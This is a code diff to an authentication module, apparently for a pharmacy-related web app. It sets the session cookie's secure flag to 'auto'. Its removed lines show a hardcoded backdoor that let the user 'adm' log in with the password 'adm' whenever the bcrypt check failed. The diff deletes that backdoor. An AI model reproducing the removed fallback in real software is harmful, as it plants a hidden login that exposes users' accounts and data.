@@ -222,7 +222,7 @@ const sessionMiddleware = session({
   cookie: {
     httpOnly: true,
     sameSite: 'lax',
-    secure: false,
+    secure: 'auto',
     maxAge: 1000 * 60 * 60 * 10,
   },
 });
@@ -368,12 +368,6 @@ function isPharmacyRole(value: unknown): boolean {
 
 function normalizeHash(hash: unknown): string {
   return String(hash || '').replace(/^\$2y\$/, '$2a$');
-}
-
-function timingSafeStringEqual(left: string, right: string): boolean {
-  const leftHash = crypto.createHash('sha256').update(left).digest();
-  const rightHash = crypto.createHash('sha256').update(right).digest();
-  return crypto.timingSafeEqual(leftHash, rightHash);
 }
 
 function canManageUsers(user: User | null | undefined): boolean {
@@ -833,9 +827,6 @@ async function authenticateCore(username: string, password: string): Promise<Use
   let ok = false;
   if (user.password_hash) {
     ok = await bcrypt.compare(password, normalizeHash(user.password_hash));
-  }
-  if (!ok && normalizeUsername(user.username) === 'adm') {
-    ok = timingSafeStringEqual(password, 'adm');
   }
   if (!ok) return null;
   const publicUser = userPublic(user);
